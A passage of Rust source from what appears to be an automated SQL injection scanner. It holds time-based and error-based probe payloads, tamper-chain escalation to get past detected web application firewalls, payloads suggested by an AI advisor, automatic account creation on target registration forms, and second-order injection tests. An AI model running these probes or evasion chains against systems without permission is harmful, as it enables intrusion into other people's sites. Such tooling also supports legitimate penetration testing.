            "request rejected", "waf", "web application firewall",
            "incapsula", "imperva", "akamai", "sucuri",
        ];
        waf_signatures.iter().any(|s| body_lower.contains(s))
    }

    /// Send a minimal probe payload and check if WAF is blocking this parameter.
    async fn probe_is_blocked(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        tamper: Option<&TamperChain>,
        waf_block_status: Option<u16>,
    ) -> bool {
        let raw = format!("{}'", original_value);
        let payload = match tamper {
            Some(chain) => chain.apply(&raw),
            None => raw,
        };
        let test_url = self.build_test_url(url, param, original_value, &payload);
        match self.send_request(&test_url).await {
            Ok(resp) => Self::is_waf_blocked(&resp, waf_block_status),
            Err(_) => false,
        }
    }

    /// Scan using a pre-built strategy from fingerprinting.
    async fn scan_with_strategy(&self, url: &str, profile: &TargetProfile) -> Result<Vec<SqliTestResult>> {
        let mut results = Vec::new();

        // Only test parameters that are likely DB-backed
        let target_params: Vec<&ParameterProfile> = profile.parameters.iter()
            .filter(|p| p.likely_db_param || p.influences_output)
            .collect();

        // If no params seem promising, test all (fallback)
        let params_to_test: Vec<&ParameterProfile> = if target_params.is_empty() {
            profile.parameters.iter().collect()
        } else {
            target_params
        };

        // Build tamper chain if WAF detected
        let tamper = if !profile.strategy.tamper_chain.is_empty() {
            let names: Vec<&str> = profile.strategy.tamper_chain.iter().map(|s| s.as_str()).collect();
            Some(TamperChain::from_names(&names))
        } else {
            None
        };
        let tamper_ref = tamper.as_ref();

        let advisor = AiAdvisor::new(self.config.ai_advisor.clone());
        let waf_block_status = profile.waf.as_ref().map(|w| w.block_status);

        // Build the full tamper escalation list for this target:
        // vendor-specific multi-tamper chains first, then generic fallback.
        let waf_name = profile.waf.as_ref().map(|w| w.name.as_str());
        let waf_recommended: Vec<String> = profile.waf.as_ref()
            .map(|w| w.recommended_tampers.clone())
            .unwrap_or_default();
        let escalation_list: Vec<Vec<String>> = super::evasion::waf_bypass::build_escalation_list(
            waf_name, &waf_recommended
        );

        for param in &params_to_test {
            if self.is_scan_cancelled() { break; }

            // Track which tamper names we've tried for this param to avoid repeating
            let mut tried_tampers: HashSet<String> = profile.strategy.tamper_chain
                .iter().cloned().collect();

            // Test techniques in strategy-recommended order
            'technique: for technique_name in &profile.strategy.technique_order {
                let technique = match technique_name.as_str() {
                    "ErrorBased"    => SqliTechnique::ErrorBased,
                    "BooleanBlind"  => SqliTechnique::BooleanBlind,
                    "TimeBased"     => SqliTechnique::TimeBased,
                    "UnionBased"    => SqliTechnique::UnionBased,
                    "StackedQueries"=> SqliTechnique::StackedQueries,
                    "OutOfBand"     => SqliTechnique::OutOfBand,
                    _ => continue,
                };

                // ── AI advisor: try personalized payloads first ────────────────
                if self.config.ai_advisor.enabled && technique != SqliTechnique::OutOfBand {
                    let ctx = TargetContext {
                        parameter: param.name.clone(),
                        param_type: if param.is_numeric { "numeric".to_string() } else { "string".to_string() },
                        dbms_hint: profile.dbms_hint.clone(),
                        waf_name: profile.waf.as_ref().map(|w| w.name.clone()),
                        error_snippet: None,
                        reflects_errors: profile.behavior.reflects_errors,
                        reflects_input: profile.behavior.reflects_input,
                        technique: technique_name.to_lowercase()
                            .replace("based", "").replace("blind", "").trim().to_string(),
                    };
                    let suggestions = advisor.suggest(&ctx).await;
                    if !suggestions.is_empty() {
                        let baseline = self.send_request(url).await.ok();
                        if let Some(r) = self.test_ai_payloads(
                            url, &param.name, &param.original_value,
                            &suggestions, technique, baseline.as_ref(), tamper_ref,
                        ).await {
                            results.push(r);
                            continue 'technique;
                        }
                    }
                }

                // ── Static payloads with current tamper ────────────────────────
                let result = self.run_technique(
                    url, param, technique, tamper_ref, profile.dbms_hint.as_deref()
                ).await;
                if let Some(r) = result {
                    results.push(r);
                    continue 'technique;
                }

                // ── Adaptive tamper escalation (WAF bypass) ────────────────────
                // Only escalate if a WAF is present and the target didn't just return
                // "no vuln" — we verify blocking with a quick probe first.
                if profile.waf.is_some() {
                    let blocked = self.probe_is_blocked(
                        url, &param.name, &param.original_value,
                        tamper_ref, waf_block_status,
                    ).await;

                    if blocked {
                        debug!(
                            "WAF blocking param={} technique={} — starting tamper escalation",
                            param.name, technique_name
                        );
                        for chain in &escalation_list {
                            let chain_key = chain.join(",");
                            if tried_tampers.contains(&chain_key) { continue; }
                            tried_tampers.insert(chain_key.clone());

                            let names: Vec<&str> = chain.iter().map(|s| s.as_str()).collect();
                            let escalated = TamperChain::from_names(&names);
                            let esc_ref = &escalated;

                            let esc_result = self.run_technique(
                                url, param, technique, Some(esc_ref),
                                profile.dbms_hint.as_deref(),
                            ).await;

                            if let Some(mut r) = esc_result {
                                // Tag evidence so analysts know which tamper chain broke through
                                r.evidence = format!("[tamper:{}] {}", chain_key, r.evidence);
                                results.push(r);
                                continue 'technique;
                            }

                            // Check if this chain also got blocked; if not, WAF is
                            // no longer the issue — stop escalating
                            let still_blocked = self.probe_is_blocked(
                                url, &param.name, &param.original_value,
                                Some(esc_ref), waf_block_status,
                            ).await;
                            if !still_blocked {
                                debug!("Tamper chain '{}' bypassed WAF but no vuln found — stopping escalation", chain_key);
                                break;
                            }
                        }
                    }
                }
            }
        }

        Ok(results)
    }

    /// Dispatch a single technique test — used by both the main loop and escalation.
    async fn run_technique(
        &self,
        url: &str,
        param: &super::fingerprint::ParameterProfile,
        technique: SqliTechnique,
        tamper: Option<&TamperChain>,
        dbms_hint: Option<&str>,
    ) -> Option<SqliTestResult> {
        match technique {
            SqliTechnique::ErrorBased => {
                let baseline = self.send_request(url).await.ok()?;
                self.test_error_based(url, &param.name, &param.original_value, &baseline, tamper).await
            }
            SqliTechnique::BooleanBlind => {
                let baseline = self.send_request(url).await.ok()?;
                self.test_boolean_blind(url, &param.name, &param.original_value, &baseline, tamper).await
            }
            SqliTechnique::TimeBased => {
                self.test_time_based(url, &param.name, &param.original_value, tamper).await
            }
            SqliTechnique::UnionBased => {
                let baseline = self.send_request(url).await.ok()?;
                self.test_union_based(url, &param.name, &param.original_value, &baseline, tamper).await
            }
            SqliTechnique::StackedQueries => {
                self.test_stacked_queries(url, &param.name, &param.original_value, tamper).await
            }
            SqliTechnique::OutOfBand => {
                self.test_out_of_band(url, &param.name, &param.original_value, tamper).await
            }
            SqliTechnique::SecondOrder => {
                // Second-order injection is handled via the dedicated auto-scan phase,
                // not through per-parameter technique testing.
                None
            }
            SqliTechnique::CodeInjection => {
                self.test_code_injection(url, &param.name, &param.original_value).await
            }
        }
    }

    /// Attempt to automatically create a test account using a discovered registration form.
    pub async fn auto_provision(
        &self,
        point: &super::crawler::models::InjectionPoint,
    ) -> Result<super::models::ProvisioningResult> {
        if point.form_type != Some(super::models::FormType::Registration) {
            return Err(anyhow!("Injection point is not a registration form"));
        }

        let test_id = uuid::Uuid::new_v4().to_string()[..8].to_string();
        let username = format!("sqx_test_{}", test_id);
        let password = format!("SQX_Pass_{}!", test_id);
        let email = format!("{}@sqx-test.local", username);

        let mut form_data = HashMap::new();
        for param in &point.parameters {
            let val = match param.name.to_lowercase().as_str() {
                "username" | "user" | "login" | "nickname" => username.clone(),
                "password" | "pass" | "pwd" | "repassword" | "confirm_password" | "password_confirm" => password.clone(),
                "email" | "e-mail" | "mail" => email.clone(),
                "fullname" | "name" | "first_name" | "last_name" => "SQX Security Test".to_string(),
                "captcha" => "1234".to_string(), // guess
                _ => param.default_value.clone().unwrap_or_else(|| "1".to_string()),
            };
            form_data.insert(param.name.clone(), val);
        }

        info!("Attempting auto-provisioning on {}: user={}", point.url, username);

        let body = form_data.iter()
            .map(|(k, v)| format!("{}={}", urlencoding::encode(k), urlencoding::encode(v)))
            .collect::<Vec<_>>()
            .join("&");

        let resp = self.send_post_request(&point.url, body, "application/x-www-form-urlencoded").await?;

        // Heuristics for success: 302 redirect or "success" strings
        let success = resp.status == 302 
            || resp.body.to_lowercase().contains("success") 
            || resp.body.to_lowercase().contains("account created")
            || resp.body.to_lowercase().contains("registered");

        if success {
            info!("Auto-provisioning successful! Creds: {}:{}", username, password);
        } else {
            warn!("Auto-provisioning failed (status {}). Response: {}", resp.status, resp.body.chars().take(100).collect::<String>());
        }

        Ok(super::models::ProvisioningResult {
            success,
            username,
            password,
            message: if success { "Account created".to_string() } else { "Failed to create account".to_string() },
            registration_url: point.url.clone(),
        })
    }

    /// Discover second-order candidates by injecting unique markers and looking for reflection.
    pub async fn discover_second_order_candidates(
        &self,
        crawl: &super::crawler::models::CrawlResult,
        provision: &super::models::ProvisioningResult,
    ) -> Vec<super::models::SecondOrderCandidate> {
        let mut candidates = Vec::new();
        if !provision.success { return candidates; }

        // 1. Identify "source" forms (registration, profile update)
        let sources: Vec<_> = crawl.injection_points.iter()
            .filter(|p| matches!(p.form_type, Some(super::models::FormType::Registration) | Some(super::models::FormType::ProfileUpdate)))
            .collect();

        // 2. Identify "sink" pages (visited pages that might show the data)
        let sinks = &crawl.visited_pages;

        for source in sources {
            for param in &source.parameters {
                // Only test string-like parameters for reflection
                if matches!(param.input_type.as_deref(), Some("password") | Some("hidden")) { continue; }

                let marker = format!("SQX_REFLECT_{}", uuid::Uuid::new_v4().to_string()[..8].to_string());
                let mut form_data = HashMap::new();
                
                // Fill form data, injecting marker in the current parameter
                for p in &source.parameters {
                    let val = if p.name == param.name {
                        marker.clone()
                    } else if p.name.to_lowercase().contains("user") || p.name.to_lowercase() == "login" {
                        provision.username.clone()
                    } else if p.name.to_lowercase().contains("pass") {
                        provision.password.clone()
                    } else {
                        p.default_value.clone().unwrap_or_else(|| "1".to_string())
                    };
                    form_data.insert(p.name.clone(), val);
                }

                // Submit form
                let body = form_data.iter()
                    .map(|(k, v)| format!("{}={}", urlencoding::encode(k), urlencoding::encode(v)))
                    .collect::<Vec<_>>()
                    .join("&");
                
                let _ = self.send_post_request(&source.url, body, "application/x-www-form-urlencoded").await;

                // 3. Visit sinks and look for marker
                for sink_url in sinks {
                    if let Ok(resp) = self.send_request(sink_url).await {
                        if resp.body.contains(&marker) {
                            debug!("Found second-order reflection! Source: {} (param: {}), Sink: {}", source.url, param.name, sink_url);
                            candidates.push(super::models::SecondOrderCandidate {
                                source_url: source.url.clone(),
                                source_form_data: form_data.clone(),
                                sink_url: sink_url.clone(),
                                affected_param: param.name.clone(),
                                form_type: source.form_type.clone().unwrap_or(super::models::FormType::GenericInput),
                            });
                        }
                    }
                }
            }
        }

        candidates
    }

    /// Test a second-order candidate for SQL injection.
    pub async fn test_second_order(
        &self,
        candidate: &super::models::SecondOrderCandidate,
    ) -> Vec<SqliTestResult> {
        let mut results = Vec::new();
        info!("Testing second-order SQLi: Source={} Sink={}", candidate.source_url, candidate.sink_url);

        // Baseline on Sink
        let baseline = match self.send_request(&candidate.sink_url).await {
            Ok(r) => r,
            Err(_) => return results,
        };

        // 1. Time-based probe
        let sleep_secs = self.sleep_duration_secs();
        let time_payload = format!("' AND SLEEP({})-- ", sleep_secs);
        
        // Inject into Source
        let mut data = candidate.source_form_data.clone();
        data.insert(candidate.affected_param.clone(), format!("sqx_test{}", time_payload));
        let body = data.iter()
            .map(|(k, v)| format!("{}={}", urlencoding::encode(k), urlencoding::encode(v)))
            .collect::<Vec<_>>()
            .join("&");
        
        let _ = self.send_post_request(&candidate.source_url, body, "application/x-www-form-urlencoded").await;

        // Check Sink for delay
        let start = Instant::now();
        if let Ok(_) = self.send_request(&candidate.sink_url).await {
            let duration = start.elapsed();
            if duration.as_secs() >= sleep_secs {
                info!("Second-order Time-based SQLi found on sink: {}", candidate.sink_url);
                results.push(SqliTestResult {
                    parameter: candidate.affected_param.clone(),
                    technique: SqliTechnique::SecondOrder,
                    confidence: 0.9,
                    payload: time_payload,
                    evidence: format!("Sink page delayed by {}s", duration.as_secs()),
                    dbms_hint: None,
                    injection_context: None,
                    payload_id: None,
                });
            }
        }

        // 2. Error-based probe
        let error_payload = "'";
        let mut data = candidate.source_form_data.clone();
        data.insert(candidate.affected_param.clone(), format!("sqx_test{}", error_payload));
        let body = data.iter()
            .map(|(k, v)| format!("{}={}", urlencoding::encode(k), urlencoding::encode(v)))
            .collect::<Vec<_>>()
            .join("&");
        
        let _ = self.send_post_request(&candidate.source_url, body, "application/x-www-form-urlencoded").await;

        // Check Sink for errors
        if let Ok(resp) = self.send_request(&candidate.sink_url).await {
            if let Some(error_msg) = detect_sql_error(&resp.body) {
                info!("Second-order Error-based SQLi found on sink: {}", candidate.sink_url);
                results.push(SqliTestResult {
                    parameter: candidate.affected_param.clone(),
                    technique: SqliTechnique::SecondOrder,
                    confidence: 0.95,
                    payload: error_payload.to_string(),
                    evidence: format!("SQL error reflected on sink: {}", error_msg),
                    dbms_hint: None,
                    injection_context: None,
                    payload_id: None,
                });
            }
        }

        results
    }

    /// Test AI-suggested payloads against the target parameter.
    /// Returns the first hit found, or None if no payload triggered a detection.
    async fn test_ai_payloads(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        suggestions: &[super::ai_advisor::AiSuggestedPayload],
        technique: SqliTechnique,
        baseline: Option<&HttpResponse>,
        tamper: Option<&TamperChain>,
    ) -> Option<SqliTestResult> {
        use super::similarity::detect_sql_error;

        let sleep_threshold = if technique == SqliTechnique::TimeBased {
            if let Some(base) = baseline {
                let estimated_stddev = std::time::Duration::from_millis(base.duration.as_millis() as u64 / 4);
                let adaptive = self.compute_adaptive_sleep(base.duration, estimated_stddev);
                self.set_adaptive_sleep(adaptive);
                adaptive
            } else {
                self.sleep_duration_secs()
            }
        } else {
            self.sleep_duration_secs()
        };

        for suggestion in suggestions {
            let raw_payload = &suggestion.payload;
            let payload = match tamper {
                Some(chain) => chain.apply(raw_payload),
                None => raw_payload.clone(),
            };

            let test_url = self.build_test_url(url, param, original_value, &payload);
            let start = std::time::Instant::now();
            let resp = match self.send_request(&test_url).await {
                Ok(r) => r,
                Err(_) => continue,
            };
            let elapsed = start.elapsed();

            match technique {
                SqliTechnique::ErrorBased => {
                    if let Some(evidence) = detect_sql_error(&resp.body) {
                        return Some(SqliTestResult {
                            parameter: param.to_string(),
                            technique: SqliTechnique::ErrorBased,
                            confidence: 0.92,
                            payload: payload.clone(),
                            evidence: format!("[AI] {}", evidence),
                            dbms_hint: None,
                            injection_context: None,
                            payload_id: None,
                        });

                    }
                }
                SqliTechnique::TimeBased => {
                    if elapsed.as_secs() >= sleep_threshold {
                        return Some(SqliTestResult {
                            parameter: param.to_string(),
                            technique: SqliTechnique::TimeBased,
                            confidence: 0.85,
                            payload: payload.clone(),
                            evidence: format!("[AI] Response delayed {}ms (threshold {}s)", elapsed.as_millis(), sleep_threshold),
                            dbms_hint: None,
                            injection_context: None,
                            payload_id: None,
                        });

                    }
                }
                SqliTechnique::BooleanBlind | SqliTechnique::UnionBased | SqliTechnique::StackedQueries => {
                    if let Some(base) = baseline {
                        let len_diff = (base.body.len() as i64 - resp.body.len() as i64).abs();
                        if len_diff > 50 && base.status == resp.status {
                            return Some(SqliTestResult {
                                parameter: param.to_string(),
                                technique,
                                confidence: 0.70,
                                payload: payload.clone(),
                                evidence: format!("[AI] Response length changed: {} → {}", base.body.len(), resp.body.len()),
                                dbms_hint: None,
                                injection_context: None,
                                payload_id: None,
                            });

                        }
                    }
                }
                SqliTechnique::OutOfBand | SqliTechnique::SecondOrder => {}
                SqliTechnique::CodeInjection => {} // detected via probe, not AI payloads
            }
        }

        None
    }
}
